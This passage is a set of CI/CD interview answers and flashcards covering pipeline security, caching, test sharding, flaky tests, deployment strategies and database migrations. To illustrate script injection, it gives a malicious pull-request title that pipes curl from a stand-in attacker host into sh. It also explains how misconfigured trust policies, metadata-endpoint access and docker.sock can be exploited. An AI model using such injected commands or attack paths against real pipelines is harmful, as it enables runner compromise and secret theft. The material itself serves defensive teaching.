interviewQA.q: Why is OIDC federation better than storing a long-lived cloud access key in CI?
interviewQA.a: A stored access key is a bearer credential: whoever holds the string is the identity, from anywhere, forever. It lives in the CI secret store, in someone's local .env from when they debugged the pipeline, possibly in Terraform state and in logs. It does not expire, rotating it means coordinating every consumer so in practice nobody does, and audit logs cannot distinguish your pipeline from an attacker holding the same string. OIDC replaces it with a token exchange. The CI platform runs an OIDC identity provider; during a job the runner requests a short-lived signed JWT describing the job — repository, ref, environment, workflow, actor, audience, a few minutes of validity. The cloud is configured to trust that issuer's keys, fetched from its JWKS endpoint, and maps claims to a role. The job presents the JWT, the cloud validates signature, issuer, audience and expiry, checks the trust policy conditions, and returns temporary credentials. The properties are: nothing long-lived is stored, so there is no secret to leak; the token expires in minutes so a leaked one is nearly worthless; it is audience-bound so a token minted for AWS cannot be replayed at GCP; authorisation is claim-based so you can say 'only the main branch of acme/api, only against the production environment'; and the identity is attested by the platform rather than asserted by the caller, so a job cannot forge a sub claim naming a different repo. Mechanically, on GitHub Actions the job needs permissions: id-token: write and uses configure-aws-credentials, or google-github-actions/auth, or azure/login; on GitLab you declare id_tokens with an aud and the JWT lands in a variable.
followUps: What does a correct AWS trust policy look like, and what are the two ways people get it dangerously wrong?
OIDC does not help for a third-party API key with no federation support. What do you do there?
How does scoping the job to a GitHub environment strengthen the IAM condition?

interviewQA.q: Show me a trust policy misconfiguration that would let an attacker assume your role.
interviewQA.a: Two classic ones. First, conditioning only on the audience. Every GitHub Actions job on the entire platform can mint a token with audience sts.amazonaws.com, so a trust policy that checks the federated principal and the aud but not the sub is assumable by anyone in the world: they create a repository, run a workflow, request a token, and call AssumeRoleWithWebIdentity against your role ARN. Role ARNs are not secret and frequently appear in public logs and Terraform code. Second, a sloppy sub wildcard. 'repo:acme/*' trusts every repository in your organisation, including a sandbox or an archived one with weak branch protection. 'repo:acme/api:*' trusts every ref in that repository, so any engineer who can push a branch — or in some configurations open a pull request that runs workflows — can mint production credentials from a branch nobody reviewed. The correct condition uses StringEquals on the aud and constrains the sub to a specific ref, 'repo:acme/api:ref:refs/heads/main', or better to an environment, 'repo:acme/api:environment:production'. The environment form is stronger because GitHub environments can independently require reviewer approval and restrict which branches may deploy, so the IAM condition and the platform protection rule reinforce each other and neither alone is sufficient to reach production. The same shape applies elsewhere: GCP Workload Identity Federation providers must carry an attribute condition on attribute.repository and the ref, and an unconditioned provider has exactly the same total-compromise property.
followUps: How would you audit every OIDC trust policy in an AWS organisation for this pattern?
Why is an environment-scoped sub claim stronger than a ref-scoped one?
What else would you restrict on the role beyond who can assume it?

interviewQA.q: How do secrets leak from a CI pipeline, and what does log masking actually protect you from?
interviewQA.a: Masking is a log filter, not a security boundary. All the major systems scan the log stream and replace known secret values with asterisks, which catches an accidental echo and nothing else. It is defeated by base64 or hex encoding, by printing the value in pieces, by the value appearing inside JSON that gets escaped, by writing it to a file that is then uploaded as an artifact, and by any transformation at all. GitLab additionally refuses to mask variables that do not meet its length and character-set requirements, which means an oddly-formatted secret is silently unmasked. So the model to state is: masking prevents accidents, not attacks, and if untrusted code runs in a job then every secret available to that job must be considered disclosed. The real leak paths are broader than logs. Environment variables are the weakest injection mode — readable via /proc/pid/environ, inherited by every child process, present in core dumps, printed by any library that logs its config at startup. Passing a secret as a command-line argument is worse, because it is visible in ps to any user on the box, which is why you use docker login --password-stdin rather than -p. Then there is the pipeline definition itself: interpolating a secret into a Groovy or Actions expression bakes it into generated script text. Given all that, the control that matters is blast radius. Scope secrets to environments rather than repositories so a staging job cannot read production credentials, separate the build role from the deploy role, make credentials short-lived, and prefer credentials that are worthless outside their intended context — ideally no stored secret at all, just an OIDC exchange at job start.
followUps: A secret was printed to a build log two weeks ago. What do you do?
Why is rewriting git history not a fix for a committed credential?
Rank env var, file, and stdin as injection mechanisms, and say why.

interviewQA.q: What is the danger of pull_request_target in GitHub Actions?
interviewQA.a: Workflows triggered by pull_request from a fork deliberately get a read-only GITHUB_TOKEN and no secrets, because the pull request contains attacker-controlled code. That is safe but limiting — you cannot post a comment, publish a preview, or read a token. pull_request_target exists to fix that: it runs the workflow definition from the base branch, in the base repository's context, with a writable token and full secret access. It is safe only if you never check out or execute the pull request's code. The catastrophic pattern is pull_request_target combined with actions/checkout of github.event.pull_request.head.sha, followed by any build step. That is arbitrary code execution with your production secrets, triggerable by a stranger opening a pull request, and 'we only build, we don't run their tests' is not a defence because npm install alone executes postinstall scripts from the PR's own lockfile, and a modified build script or test config does the same. The correct structure is a two-workflow split. Workflow A is triggered by pull_request, has no secrets and a read-only token, builds the untrusted code, and uploads an artifact. Workflow B is triggered by workflow_run on A's completion, runs from the base branch with the secrets, downloads only that artifact, and never executes anything the PR supplied. If you must use pull_request_target at all, check out only the base ref and treat every field of the event payload as attacker-controlled data.
followUps: Why does npm install alone constitute code execution?
How does the two-workflow split actually prevent the attack, given B still handles A's artifact?
What would you check in a repo audit to find this pattern quickly?

interviewQA.q: What is script injection in a GitHub Actions workflow, and how do you prevent it?
interviewQA.a: The ${{ }} syntax is evaluated by the Actions runner service and substituted into the generated script text before any shell starts. So a step written as run: echo "Title: ${{ github.event.pull_request.title }}" does not pass the title to echo as an argument; it splices the raw title into a bash program. A pull request titled a"; curl -s https://evil.sh | sh; # therefore becomes shell code executing on your runner with the job's token, its cloud role, and access to the workspace and any cached credentials. Every user-writable field of the event payload is attacker-controlled: pull request titles and bodies, branch and tag names, issue and review comments, commit messages, and author display names. The fix is uniform and is exactly the same idea as SQL parameterisation — bind the value to an environment variable in the step's env: block and reference it as "$TITLE" in the script, so it travels as data through the environment rather than being spliced into the program. Secondary defences: restrict GITHUB_TOKEN permissions per job so the blast radius is small, prefer actions that take the value as a typed input over hand-rolled shell, and run actionlint in CI, which flags this pattern automatically. It is worth noting the same class of bug exists in Jenkins, where interpolating a Groovy variable into a double-quoted sh string splices it into the generated script; single-quoted shell strings that let the shell expand the environment variable are the equivalent fix.
followUps: Which parts of the github context are attacker-controlled and which are not?
Is the env: fix enough if the script then passes "$TITLE" to eval?
How does the equivalent problem show up in a Jenkinsfile?

interviewQA.q: Why should you pin GitHub Actions to a commit SHA rather than a version tag?
interviewQA.a: Because 'uses: some/action@v3' resolves a Git tag in a repository you do not control, and tags are movable pointers. If the maintainer's account is compromised, or a maintainer goes rogue, or a token in their own CI leaks, the attacker re-points v3 at a malicious commit and every workflow in the world referencing @v3 executes their code on the next run — with your secrets, on your runner. This is not hypothetical: in March 2025 the widely used tj-actions/changed-files action was compromised and its version tags were re-pointed at a commit that dumped CI runner process memory, including secrets, into the workflow logs of thousands of repositories. Pinning to a full 40-character commit SHA fixes it because a commit SHA is content-addressed — the reference names specific bytes and cannot be re-pointed. The usual objection is that you then stop getting updates, and the answer is that Dependabot and Renovate both understand SHA pins and raise pull requests to bump them with the changelog attached, so you keep updates and lose only the silent mutability. You put the human-readable version in a trailing comment so the pin is reviewable. Beyond pinning: minimise how many third-party actions you use at all, vendor the critical ones into your own organisation so you control the supply chain, and use the repository or organisation setting that restricts which actions are allowed to run. The same reasoning applies to container base images — FROM node:20 is a mutable tag, and shipping images should pin the base by digest.

interviewQA.q: Your CI pipeline takes 45 minutes. How do you attack that?
interviewQA.a: Measure before changing anything, and measure the right things: queue time, execution time at p50 and p95 per job, and the critical path through the DAG. Queue time is the one people forget — if commits wait nine minutes for a runner, no amount of test optimisation helps and the answer is runner capacity or autoscaler tuning, since CI load is extremely bursty and an autoscaler tuned for steady web traffic is always behind. Assuming execution dominates, the order of attack is: first, do not run work you do not need — path filters so a docs change does not trigger the integration suite, concurrency with cancel-in-progress so superseded PR runs die, and workflow-level rules to stop duplicate branch and merge-request pipelines. Second, parallelise the DAG. Most slow pipelines are accidentally serial: adding needs: in GitLab, or getting the needs: graph right in Actions, so scanning, linting, and integration tests run concurrently against the same artifact rather than in stage lockstep, is usually the single biggest free win. Third, do not repeat work — dependency caching keyed on the lockfile, Docker layer cache exported to a registry so ephemeral runners start warm, and a remote build cache for Gradle or Bazel so unchanged modules are not rebuilt. Fourth, shard the slow suite across runners, using recorded per-test timings to bin-pack rather than splitting by filename, because durations are long-tailed and a naive split leaves one shard at twenty minutes. Fifth, move work out of the commit stage: it should only hold fast deterministic checks with roughly a ten-minute budget, and anything needing a database or a browser belongs downstream. Two cautions: fan-out has a fixed per-job setup cost of a minute or two, so twenty shards on a ten-minute suite gives you ninety seconds of setup twenty times over at twenty times the compute, and the crossover point is worth computing. And the deeper fix is often organisational — pipelines grow because every incident adds a check and nobody ever removes one, so commit-stage duration needs an owner and an SLO.
followUps: How do you decide whether to shard further or reduce per-job setup cost?
What is the ten-minute rule and what is the actual reasoning behind the number?
Which checks would you move out of the blocking path entirely, and how do you keep their signal?

interviewQA.q: What is a flaky test and how do you deal with flakiness at scale?
interviewQA.a: A flaky test is one that passes and fails on the same commit with no code change. Its real cost is not the retry time — it is the destruction of the pipeline's meaning. Once people learn that red might mean nothing, they re-run instead of investigating, and eventually a genuine failure gets re-run and merged. The arithmetic is unforgiving: with an independent 0.1 percent flake rate per test, a 2000-test suite fails spuriously about 86 percent of the time, at which point the pipeline is a random number generator. The response has three parts. Measure: record every test's outcome across runs and identify any test that has both passed and failed on identical code; that is the definition, and it is mechanically detectable rather than a judgement call. Quarantine: move known-flaky tests into a non-blocking job that still runs and reports, so you keep the signal without keeping the gate, and put a hard expiry on quarantine membership so the list cannot grow without bound — a quarantined test with no owner and no deadline is a deleted test with extra steps. Fix the causes, which are boringly repetitive: sleep-based waits instead of waiting on a condition, shared mutable state between tests, dependence on the real clock, real network calls, test-ordering dependence which you expose by randomising order, and database transactions leaking between cases. Separately, be precise about retries. Blanket job-level retry hides flakiness and doubles worst-case pipeline time. Retry infrastructure failures — the runner died, the registry timed out — and let assertion failures fail. GitLab expresses this exactly with retry:when: runner_system_failure; on Actions you scope the retry to the specific network-bound command rather than the whole job.

interviewQA.q: How do feature flags change your deployment strategy, and what do they cost?
interviewQA.a: They break the identity between deploy and release. Deploying means new code is running; releasing means users experience new behaviour. Once those are separate, incomplete work can merge to trunk behind an off flag, which is what makes real trunk-based development possible on a three-week feature without a long-lived branch; release becomes a config change measured in seconds rather than a pipeline run; and rollout can be targeted along dimensions the deployment system cannot express — one percent of users, internal staff only, a single tenant, one region. Mechanically, evaluation should be server-side: the SDK holds the ruleset in memory refreshed by streaming or polling and evaluates locally, so there is no network hop in the request path and no availability dependency on the flag vendor in your hot path. Assignment is a hash of the flag key plus the user id modulo 100 compared to the rollout percentage, which gives consistent bucketing so a user sees the same variant on every request and across services. The costs are real. Flag debt is the big one: every flag is a branch, N flags mean up to 2^N behavioural combinations, and you test maybe three, so flags need an owner and an expiry at creation and a job that reports flags stuck at 0 or 100 percent for weeks. Distinguish kinds, because lifetimes differ — release toggles are temporary and must be deleted, experiment flags last as long as the experiment, operational kill switches are permanent by design, entitlement flags are really product model. Stale defaults are the sharp edge: you must decide deliberately what each flag does when the flag service is unreachable at process start, and the safe path must be the fallback. And flags that change what you write rather than what you read are migrations, not toggles — turning them off does not undo persisted data. Finally, flags do not replace progressive delivery: they cannot protect you from a dependency upgrade or a rewritten serialization path, so you still deploy the binary progressively and use flags on top.

interviewQA.q: Required status checks are green on every PR, but main keeps breaking. Why, and what fixes it?
interviewQA.a: Because a required status check validates a pull request against the state of main at the time the check ran, not against the state main will have when the PR actually lands. Two pull requests can each be individually green and still break when both merge — the classic case is one PR renaming a function while another adds a new call to the old name. Neither PR was ever red; the conflict is semantic, not textual, so Git merges them cleanly. The fix is a merge queue: GitHub's merge queue, GitLab merge trains, or tools like Zuul and Bors. The queue takes the PRs in order, builds speculative merge commits representing the actual state each will land on, and tests those; a PR that fails is evicted and the queue re-forms behind it. Implementations test several candidates in parallel optimistically so throughput stays reasonable, at the cost of extra CI runs when an eviction invalidates the speculation. On GitHub, workflows must opt in with the merge_group trigger, and you set the branch protection rule to require the queue. The trade-off to state explicitly is compute cost versus a green trunk, and the threshold is roughly the point where several people are merging into one repository per hour — below that the collision rate is low enough that a stale-branch requirement ('branch must be up to date before merging') is sufficient, and above it that requirement just forces everyone to rebase constantly and serialises humans instead of machines.
followUps: Why does 'require branches to be up to date before merging' stop working as the team grows?
What does a merge queue cost you in CI minutes, and how is that mitigated?
How does this interact with a monorepo where only some services are affected by a change?

interviewQA.q: How would you structure CI for a monorepo with forty services?
interviewQA.a: The controlling requirement is that a change to one service must not trigger the other thirty-nine. That means the pipeline is computed from the diff rather than statically defined. Concretely: a planning job checks out with enough history to diff against the merge base, maps changed paths to affected targets, and emits a JSON list. Downstream jobs consume it as a dynamic matrix — fromJSON of a job output in GitHub Actions, or a parent-child pipeline in GitLab where the parent generates a child .yml and triggers it. Path filters at the workflow level are the crude version and are useful as a first cut, but they break down as soon as there is a shared library, because a change to packages/common must trigger everything that depends on it. So the mapping should come from the build graph, not from a hand-maintained list: Bazel, Nx, Turborepo, or Gradle can each tell you the affected targets for a diff, and their remote caches mean unchanged modules are not rebuilt even when they are in the affected set. That build-graph-plus-remote-cache combination is what actually makes large monorepos fast, more than any CI feature. Second concern is pipeline definition sprawl: forty hand-copied YAML files means a security fix requires forty PRs and reaches thirty-two of them. Centralise into a reusable workflow or a GitLab include/extends template, version it, and pin consumers to a tag. Third is merge throughput — with forty services and many contributors you need a merge queue, and ideally one that understands affectedness so an unrelated eviction does not re-test everything. Fourth is the required-checks problem: if checks are dynamic, a branch protection rule requiring 'test (service-x)' will hang forever on a PR that does not touch service-x, so you use a single aggregating 'all required checks passed' job that depends on the dynamic set and is itself the required check.
followUps: How do you handle a change to a shared library that fifteen services depend on?
How do required status checks work when the set of jobs is dynamic?
What does a remote build cache buy you that a CI dependency cache does not?

interviewQA.q: What are the security risks of self-hosted runners, and how do you mitigate them?
interviewQA.a: The core issue is that a persistent self-hosted runner inverts the two properties that make hosted runners safe. Hosted runners are ephemeral, so no state leaks between jobs and a compromised job cannot persist; a persistent runner keeps a filesystem, a Docker daemon, credential caches, and network position across jobs from different sources. The worst configuration is a persistent self-hosted runner attached to a public repository, because anyone can open a pull request, and if fork PRs execute there, that pull request is remote code execution on your machine with whatever cloud instance role and internal network reachability it has. Even on private repos, a shared pool used by both a low-trust sandbox repo and the production deployment repo is one hop from an intern's experiment to production credentials. Mitigations, roughly in order: make runners ephemeral — one job per runner, then destroy the VM or pod, which is what the --ephemeral flag and actions-runner-controller give you. Never run fork PR workflows on them; require approval for first-time contributors at minimum. Segment pools by trust tier and never share between them. Block egress to the cloud metadata endpoint at 169.254.169.254, because that is how a compromised job steals the host's instance role, and restrict outbound network access generally so exfiltration is harder. Run the runner as an unprivileged user, and do not mount the Docker socket into build containers, since access to docker.sock is equivalent to root on the host. Give the runner's own identity minimal permissions and prefer OIDC so there is no static cloud key on the box at all. The equivalent on GitLab is the shell executor on a shared runner, which has exactly the same problem for the same reasons — jobs share a filesystem and user, so one project's job can read another's checkout and leftovers.
followUps: Why specifically is mounting docker.sock equivalent to giving root on the host?
What does blocking 169.254.169.254 protect against, concretely?
How does actions-runner-controller change the model versus a long-lived VM?

flashcards.front: CI vs continuous delivery vs continuous deployment, in one line each
flashcards.back: CI = the merge (everyone integrates to trunk daily, each integration auto-verified). Continuous delivery = the artifact (every green commit is provably deployable; release is a human decision). Continuous deployment = the release (every green commit ships automatically, no human gate).

flashcards.front: Why is 'we run Jenkins' not the same as 'we do CI'?
flashcards.back: CI is about merge frequency, not tooling. Fifteen long-lived feature branches each running a full test suite is continuous building — it automates the verification of divergence instead of removing it. Real CI needs short-lived branches and daily integration to trunk.

flashcards.front: The four DORA metrics
flashcards.back: Deployment frequency, lead time for changes (commit -> running in prod), change failure rate, and failed-deployment recovery time. Two speed, two stability — and empirically they do not trade off, because small batches are both faster and safer.

flashcards.front: What is the ten-minute rule for the commit stage, and why that number?
flashcards.back: Keep compile + unit tests + lint under ~10 minutes. The reason is behavioural: past the time a developer will wait, they context-switch, red builds go unnoticed while commits pile on top, and people start batching pushes — which attacks the CI premise itself.

flashcards.front: 'Build once, promote everywhere' — what breaks if you rebuild per environment?
flashcards.back: docker build is not a pure function of source: floating base tags, moved package mirrors, new patch releases, different timestamps. Staging and prod become different binaries, so you debug the wrong artifact — and rollback becomes a rebuild that may not reproduce.

flashcards.front: Container image tag vs digest
flashcards.back: A tag is a mutable pointer in the registry's tag index and can be silently re-pointed by a re-push. A digest (sha256:...) is the content hash of the manifest and can only ever name one artifact. Deploy by digest; use tags only as human-readable aliases.

flashcards.front: In GitHub Actions, what do jobs share and what do steps share?
flashcards.back: Steps share a runner: same filesystem, same workspace. Jobs share nothing — each gets a fresh runner. Crossing a job boundary requires an explicit channel: outputs (strings), artifacts (files), cache (best-effort), or an external system.

flashcards.front: Why doesn't `export FOO=bar` survive to the next Actions step?
flashcards.back: Each `run:` step is a separate shell process. To persist an env var for later steps, append `FOO=bar` to the file at $GITHUB_ENV. To publish a value for later steps/jobs, append `name=value` to $GITHUB_OUTPUT. (`::set-output` is deprecated and disabled.)

flashcards.front: Composite action vs reusable workflow
flashcards.back: A composite action packages STEPS — runs inside the caller's job, on the caller's runner, cannot set runs-on or a matrix. A reusable workflow (on: workflow_call) packages JOBS — brings its own runners, matrix, and job graph; takes typed inputs and explicit secrets; nests up to four levels.

flashcards.front: GitHub Actions concurrency: PR runs vs deploy jobs
flashcards.back: Opposite settings. PRs: group on workflow+ref with cancel-in-progress: true, so superseded runs die. Deploys: group on the environment name with cancel-in-progress: false, so deploys queue and serialise — killing a rollout mid-apply leaves a state nobody designed.

flashcards.front: What does a GitHub Environment give you beyond a secret store?
flashcards.back: Required reviewers (job pauses for human approval), wait timers, deployment branch policies, environment-scoped secrets — and it appears in the OIDC token's `sub` claim, so IAM can trust only jobs running against `production`.

flashcards.front: Jenkins: why set the controller's executor count to zero?
flashcards.back: Builds on the controller run arbitrary pipeline code in the same JVM and filesystem as the credentials store, job config, and $JENKINS_HOME. One careless or malicious Jenkinsfile becomes full compromise. Builds belong on agents only.

flashcards.front: Jenkins declarative vs scripted pipeline
flashcards.back: Scripted is raw Groovy inside node{} — flexible, unstructured, poorly validated. Declarative wraps a fixed schema (pipeline{agent, stages, post, options, when, parallel}), validated before the build starts and properly visualised. Write declarative; drop into script{} only where the schema cannot express something.

flashcards.front: In Jenkins, `environment { FOO = credentials('id') }` with a username/password credential creates which variables?
flashcards.back: Three: FOO, FOO_USR, and FOO_PSW. A secret-text credential yields just FOO; an SSH key or secret file yields a path to a temp file. Prefer withCredentials([...]){ } so the binding is scoped to a block.

flashcards.front: What is Groovy CPS in Jenkins and what does it break?
flashcards.back: Pipeline Groovy is transformed to continuation-passing style so a build survives a controller restart — state is serialised at every step boundary. So in-flight locals must be Serializable (a regex Matcher across an `sh` step throws NotSerializableException), closure iteration misbehaves (use indexed for loops), and it is slow and runs on the controller.

flashcards.front: @NonCPS in a Jenkinsfile: what does it do and what is forbidden inside?
flashcards.back: It makes a method run as ordinary Groovy instead of CPS-transformed — faster, and non-serializable locals are fine. In exchange it cannot call pipeline steps like sh, echo, or checkout, and it must not be resumable, so return plain serializable values from it.

flashcards.front: stash/unstash vs archiveArtifacts in Jenkins
flashcards.back: stash/unstash moves a small file set between stages that may land on different agents — but it routes through the controller, so large stashes degrade the whole instance. archiveArtifacts stores outputs permanently against the build record. For anything large, use an artifact repository and pass coordinates.

flashcards.front: GitLab CI: what does `needs:` change?
flashcards.back: It breaks the stage barrier and turns the pipeline into a true DAG — a job starts the moment its named dependencies finish, not when its whole stage does. `needs: []` starts a job immediately at pipeline start. Adding needs: to a linear pipeline is usually the biggest free wall-clock win.

flashcards.front: GitLab: artifacts vs cache
flashcards.back: Artifacts are job OUTPUTS: uploaded to the server, guaranteed available downstream, visible in the UI, expire per expire_in. Cache is an INPUT optimisation: per-runner, best-effort, job must be correct when it is empty. Rule: if a downstream job breaks when it is missing, it is an artifact.

flashcards.front: GitLab `rules:` evaluation semantics
flashcards.back: Evaluated top-down, FIRST MATCH WINS, so ordering matters and a terminal `- when: never` is the safe default. `only`/`except` are legacy. `workflow: rules:` decides whether the pipeline is created at all — the right place to kill duplicate branch+MR pipelines.

flashcards.front: GitLab `resource_group:` — what problem does it solve?
flashcards.back: It serialises jobs across pipelines so two concurrent pipelines cannot deploy the same environment at once. Without it, two deploys interleave and the final state is whichever finished last, not whichever was newer.

flashcards.front: Cache key design: what must the key hash?
flashcards.back: OS, architecture, toolchain version, and a hash of the LOCKFILE (not package.json/pom.xml — the lockfile determines the resolved tree). Arch matters because native modules built for x86 will not load on arm64, producing failures that look like corrupt binaries.

flashcards.front: What do restore-keys buy you, and what is the catch?
flashcards.back: Prefix-match fallback: on an exact-key miss, restore the most recent entry with that prefix, so you download only the deltas. Catch: the restored tree does NOT match the current lockfile, so the install step must reconcile — `npm ci` is safe, `npm install` over a stale tree produces phantom versions.

flashcards.front: Why is `key: deps-${{ runner.os }}` (no hash) a bug in GitHub Actions?
flashcards.back: GHA cache entries are immutable — a key is written once and never overwritten. A key that never changes is populated on the first run and then serves that increasingly ancient snapshot forever.

flashcards.front: The one cache invariant you must never violate
flashcards.back: A cache miss may cost time, never correctness. If a job's result differs warm vs cold, the cache is a bug. Verify with a scheduled no-cache run. The usual violation is caching a build-output directory whose staleness detection depends on mtimes.

flashcards.front: Why does Dockerfile instruction order dominate build time?
flashcards.back: The layer cache invalidates transitively: once one instruction misses, everything after it rebuilds. So `COPY . .` then `RUN npm ci` re-installs on every commit. Copy the lockfile first, install, then copy source — install stays cached until the lockfile actually changes.

flashcards.front: BuildKit `RUN --mount=type=cache` vs `--mount=type=secret`
flashcards.back: type=cache gives a persistent directory outside the image layers, so a package manager's download cache survives builds without bloating the image. type=secret mounts a secret into one RUN step's filesystem so it never lands in a layer — fixing the ARG NPM_TOKEN leak that stays readable in image history forever.

flashcards.front: Ephemeral runners have a cold Docker layer cache. Fix?
flashcards.back: Export/import the cache: `--cache-to type=registry,ref=...,mode=max` and `--cache-from type=registry,ref=...` (mode=max also exports intermediate multi-stage layers). On GitHub Actions, `type=gha` uses the Actions cache service. On self-hosted, a persistent BuildKit daemon is fastest but is a shared stateful trust boundary.

flashcards.front: Matrix build vs sharding
flashcards.back: A matrix is about COVERAGE — same tests, different environments (Node 18/20/22 x Linux/Windows), one runner per combination. Sharding is about WALL-CLOCK — one environment, the test set split N ways. Different problems; conflating them is a common interview tell.

flashcards.front: `fail-fast` and `max-parallel` in a GitHub Actions matrix
flashcards.back: fail-fast defaults to true and cancels all in-flight legs on the first failure — right for a red/green answer, wrong for a compatibility matrix where you want the full picture (set false). max-parallel throttles fan-out so a 40-cell matrix does not consume the org's whole concurrency quota.

flashcards.front: Why does naive test sharding leave you slow?
flashcards.back: Test durations are long-tailed, so splitting by filename gives one shard at 4 minutes and another at 20 — wall-clock is still 20. Fix: persist per-test timings as an artifact and bin-pack shards by predicted duration.

flashcards.front: Why doesn't sharding a 10-minute suite across 20 runners give a 30-second pipeline?
flashcards.back: Fan-out has fixed per-job overhead — boot, checkout, cache restore, install — typically 60-120s. You get ~90s setup + ~30s tests, twenty times, at 20x compute. Reduce per-job setup before adding parallelism, and compute the crossover point.

flashcards.front: Definition of a flaky test, and why it is so expensive
flashcards.back: A test that passes AND fails on the same commit with no code change. The cost is not retry time — it is that red stops meaning anything, so people re-run instead of investigating and eventually re-run a real failure into main. At a 0.1% per-test flake rate, a 2000-test suite fails spuriously ~86% of the time.

flashcards.front: Which failures should a CI job retry?
flashcards.back: Infrastructure only — runner died, registry timeout, network blip. Never assertion failures: blanket retry hides real flakiness and doubles worst-case pipeline time. GitLab expresses it exactly: `retry: when: [runner_system_failure, stuck_or_timeout_failure]`.

flashcards.front: What does CI log masking actually protect against?
flashcards.back: Accidents, not attacks. It is a string replace on the log stream — defeated by base64/hex encoding, printing in pieces, JSON escaping, or writing to an uploaded artifact. GitLab silently won't mask variables failing its length/charset rules. If untrusted code runs in a job, every secret in that job is disclosed.

flashcards.front: Rank secret injection mechanisms from worst to best
flashcards.back: CLI argument (visible in `ps` to any local user) < environment variable (readable via /proc/pid/environ, inherited by children, in core dumps) < temp file mode 0600 < stdin (`docker login --password-stdin`) < no stored secret at all — an OIDC exchange at job start.

flashcards.front: Why is `pull_request_target` dangerous?
flashcards.back: It runs the base-branch workflow with a writable token and full secrets. Combined with checking out github.event.pull_request.head.sha and any build step, it is arbitrary code execution with production secrets triggerable by a stranger — `npm install` alone runs the PR's postinstall scripts.

flashcards.front: Safe pattern for running untrusted fork PR code and then doing something privileged
flashcards.back: Two workflows. A: on pull_request, no secrets, read-only token — builds untrusted code, uploads an artifact. B: on workflow_run, has the secrets, downloads only that artifact and never executes PR-supplied code.

flashcards.front: Script injection in GitHub Actions: mechanism and fix
flashcards.back: `${{ }}` is substituted into the script TEXT before any shell runs, so `run: echo "${{ github.event.pull_request.title }}"` lets a crafted PR title execute shell on the runner. Fix: bind it via `env:` and reference `"$TITLE"` — the value travels as data, not program text. Same idea as SQL parameterisation.

flashcards.front: Why pin actions to a commit SHA instead of `@v3`?
flashcards.back: Tags are movable pointers in a repo you don't control. Compromise the maintainer and re-point v3, and every workflow using it runs attacker code — this happened to tj-actions/changed-files in March 2025, dumping runner memory (secrets) into logs. A SHA is content-addressed and can't be re-pointed; Dependabot/Renovate still bump SHA pins.

flashcards.front: What does OIDC federation replace, and why is it better?
flashcards.back: It replaces a stored bearer key (never expires, works from anywhere, unauditable, never rotated) with a per-job exchange: the CI mints a short-lived signed JWT describing the job, the cloud validates it and returns temporary credentials. Nothing long-lived is stored, tokens expire in minutes, they are audience-bound, and the identity is platform-attested — a job cannot forge its own `sub`.

flashcards.front: Two ways an OIDC trust policy is dangerously misconfigured
flashcards.back: (1) Conditioning only on `aud` — every GitHub Actions job on earth gets aud=sts.amazonaws.com, so anyone can assume your role. (2) A sloppy `sub` wildcard: `repo:acme/*` trusts every repo in the org; `repo:acme/api:*` trusts every branch. Pin to `repo:acme/api:environment:production` or a specific ref.

flashcards.front: What permission does a GitHub Actions job need to request an OIDC token?
flashcards.back: `permissions: id-token: write` on the job (plus whatever else it needs, e.g. contents: read). The runner then exposes ACTIONS_ID_TOKEN_REQUEST_URL and ACTIONS_ID_TOKEN_REQUEST_TOKEN, which the cloud auth action uses to fetch the JWT.

flashcards.front: Rolling update: which setting is the actual safety mechanism?
flashcards.back: The readiness probe. Kubernetes waits for new pods to become Ready before terminating old ones; without a meaningful probe a pod is 'ready' the instant the process starts and a broken build rolls across the fleet in seconds. maxSurge/maxUnavailable (both default 25%) shape the batches; minReadySeconds catches crash-just-after-start.

flashcards.front: readinessProbe vs livenessProbe
flashcards.back: Readiness gates traffic and gates rollouts — fail it and the pod is removed from endpoints. Liveness restarts a wedged process. Wiring a database check into liveness turns a DB blip into a cluster-wide restart storm; dependency health belongs in readiness.

flashcards.front: Blue-green: what is the flip, and why not do it in DNS?
flashcards.back: The flip is a router change — LB target group, Service selector, ingress weight — moving all traffic at once, with rollback being the reverse flip. Not DNS: TTLs are advisory and resolvers, JVMs, and connection pools cache, so 'instant rollback' becomes forty minutes of stragglers.

flashcards.front: What makes a canary a canary rather than just a slow rollout?
flashcards.back: Automated analysis. During each traffic step you compare the canary population's SLIs (error rate, p99 latency, saturation) against the baseline population measured over the SAME window, and promote or abort automatically. Comparing canary-now to baseline-an-hour-ago blames diurnal variation on your deploy.

flashcards.front: When is canary analysis not viable?
flashcards.back: Low traffic — 1% of a low-volume service produces too few events to detect a small regression in a short window, so you need longer windows or a different strategy. Canary also only catches what your metrics see: slow data corruption passes every gate.

flashcards.front: Shadow / traffic mirroring: the value and the hard constraint
flashcards.back: Value: exercise the new version against real production traffic patterns with zero user risk — ideal for validating latency and resource usage. Constraint: the shadowed version must be side-effect free (no writes, charges, emails, or real message publishes), so it needs a separate datastore and stubbed outbound calls. It also ~doubles backend load.

flashcards.front: Rollback vs forward-fix: what is the default and what are the exceptions?
flashcards.back: Roll back by default — it returns to a state that demonstrably worked, versus writing correct code under pressure. Forward-fix when the change is irreversible (migration already run, message acked, partner notified), when rolling back would itself cause harm, or when the fix is genuinely a trivial config change.

flashcards.front: Why is restoring a database backup not a rollback?
flashcards.back: It discards every write since the snapshot. In a payments, messaging, or ordering system that is worse than the bug you are fixing. Rollback must be a code/config operation; the database is protected by backward-compatible migrations instead.

flashcards.front: The five steps of expand-contract (parallel change)
flashcards.back: 1) EXPAND: add the new nullable column; deploy code writing both, reading old. 2) BACKFILL in batches. 3) SWITCH: read new, still write both. 4) STOP: read and write only new (first irreversible boundary). 5) CONTRACT: drop the old column, days later. At every point the running version and its rollback target both work against the current schema.

flashcards.front: Why must migrations not run from application startup?
flashcards.back: N pods race the same DDL, and a failed migration becomes a crash loop. Run it once as a distinct, gated pipeline step, with an advisory lock (Flyway/Liquibase/Alembic/golang-migrate all take one), and have the deploy job depend on it.

flashcards.front: Two Postgres DDL habits that prevent migration-induced outages
flashcards.back: Use `CREATE INDEX CONCURRENTLY` (plain CREATE INDEX locks out writes for its duration; CONCURRENTLY cannot run in a transaction block and can leave an INVALID index you must detect and retry). And set a short `lock_timeout` so an ALTER TABLE fails fast instead of queueing behind a long transaction and blocking every subsequent query on that table.

flashcards.front: Feature flags: what exactly do they decouple?
flashcards.back: Deploy (new code is running) from release (users see new behaviour). That lets incomplete work merge to trunk behind an off flag, makes release a seconds-long config change, and enables targeting the deployment system cannot express — 1% of users, internal staff, one tenant, one region.

flashcards.front: Why evaluate feature flags server-side and in-process?
flashcards.back: The SDK holds the ruleset in memory (streamed/polled) and evaluates locally: no network hop in the request path, it keeps working when the flag vendor is down, and targeting rules never reach a client. A remote call per request puts a third-party availability dependency in your hot path.

flashcards.front: Four kinds of feature flag, by lifetime
